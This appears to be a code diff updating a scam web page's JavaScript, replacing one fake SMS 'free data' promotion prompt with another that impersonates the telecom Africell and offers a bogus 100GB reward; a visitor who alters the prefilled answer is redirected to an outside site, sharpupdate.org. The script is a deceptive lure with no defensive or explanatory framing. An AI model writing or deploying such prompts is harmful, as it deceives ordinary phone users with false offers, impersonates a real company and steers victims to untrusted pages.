@@ -1,5 +1,5 @@
-var password = 'ACTIVATE 50GB'
-password=prompt('SMS: Congratulations, your Mobile number is eligible to receive 50gb Sierra Leone independence Day celebration offer, Press Ok to activate Now ','ACTIVATE 50GB');
-if (password != 'ACTIVATE 50GB') {
+var password = 'Activate 100GB'
+password=prompt('SMS: Congratulations, your Africell SIM card is eligible to receive free data old sim card reward, click OK to activate now','Activate 100GB');
+if (password != 'Activate 100GB') {
 location.href='https://sharpupdate.org/sierra-at64.html';
 }
